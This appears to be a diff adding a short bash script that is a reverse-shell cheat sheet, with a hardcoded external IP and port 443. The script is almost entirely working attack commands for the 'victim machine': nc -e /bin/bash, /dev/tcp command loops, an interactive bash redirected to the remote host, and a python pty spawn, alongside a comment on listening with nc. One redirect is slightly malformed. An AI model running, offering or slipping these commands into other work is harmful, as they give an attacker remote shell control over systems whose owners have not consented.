@@ -1,0 +1,23 @@
+#!/bin/bash
+PORT=443
+IP=150.101.119.241
+
+#. On the local machine:
+#. sudo nc -l ${PORT}
+
+#. On the victim machine:
+nc -e /bin/bash ${IP} ${PORT}
+
+#. or...
+exec 5<>/dev/tcp/${IP}/${PORT}
+cat <&5|while read l; do $l 2>&5 >&5; done
+
+#. or...
+exec 5<>/dev/tcp/${IP}/${PORT}
+cat <&5|while read l; do (bash -c "$l") 2>&5 >&5; done
+
+#. or...
+/bin/bash -i > /dev/tcp/${IP}/${PORT} 0&>1
+
+#. or...
+python -c 'import pty;pty.spawn("/bin/bash")'
